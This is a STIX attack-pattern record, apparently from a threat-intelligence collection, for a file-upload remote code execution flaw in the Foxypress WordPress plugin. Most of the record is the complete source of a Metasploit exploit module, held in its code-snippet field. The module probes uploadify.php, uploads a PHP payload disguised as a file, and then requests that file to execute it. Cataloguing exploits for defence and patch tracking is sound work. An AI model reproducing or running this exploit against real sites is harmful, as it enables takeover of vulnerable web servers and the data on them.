{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3d654cfb-d5e5-43c4-85fa-06bd0bd40adb",
    "created": "2024-08-14T17:12:34.646319Z",
    "modified": "2024-08-14T17:12:34.646323Z",
    "name": "WordPress Plugin Foxypress uploadify.php Arbitrary Code Execution",
    "description": "( This module exploits an arbitrary PHP code execution flaw in the WordPress blogging software plugin known as Foxypress. The vulnerability allows for arbitrary file upload and remote code execution via the uploadify.php script. The Foxypress plugin versions 0.4.1.1 to 0.4.2.1 are vulnerable. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_foxypress_upload.rb",
            "external_id": "wp_foxypress_upload.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6231"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'           => 'WordPress Plugin Foxypress uploadify.php Arbitrary Code Execution',\n      'Description'    => %q(\n          This module exploits an arbitrary PHP code execution flaw in the WordPress\n        blogging software plugin known as Foxypress. The vulnerability allows for arbitrary\n        file upload and remote code execution via the uploadify.php script. The Foxypress\n        plugin versions 0.4.1.1 to 0.4.2.1 are vulnerable.\n      ),\n      'Author'         =>\n        [\n          'Sammy FORGIT', # Vulnerability Discovery, PoC\n          'aushack' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['EDB', '18991'],\n          ['OSVDB' '82652'],\n          ['BID', '53805'],\n          ['WPVDB', '6231']\n        ],\n      'Privileged'     => false,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [['Foxypress 0.4.1.1 - 0.4.2.1', {}]],\n      'DisclosureDate' => '2012-06-05',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => normalize_uri(wordpress_url_plugins, 'foxypress', 'uploadify', 'uploadify.php')\n    )\n\n    return Exploit::CheckCode::Detected if res && res.code == 200\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"<?php #{payload.encoded} ?>\", 'application/octet-stream', nil, \"form-data; name=\\\"Filedata\\\"; filename=\\\"#{rand_text_alphanumeric(6)}.php\\\"\")\n\n    print_status(\"Sending PHP payload\")\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri'    => normalize_uri(wordpress_url_plugins, 'foxypress', 'uploadify', 'uploadify.php'),\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data'   => post_data.to_s\n    )\n\n    if res.nil? || res.code != 200 || res.body !~ /\\{\\\"raw_file_name\\\"\\:\\\"(\\w+)\\\"\\,/\n      print_error(\"File wasn't uploaded, aborting!\")\n      return\n    end\n\n    filename = \"#{Regexp.last_match[1]}.php\"\n\n    print_good(\"Our payload is at: #{filename}. Calling payload...\")\n    register_files_for_cleanup(filename)\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => normalize_uri(wordpress_url_wp_content, 'affiliate_images', filename)\n    )\n\n    print_error(\"Server returned #{res.code}\") if res && res.code != 200\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-05",
    "x_mitre_platforms": [
        "php'"
    ]
}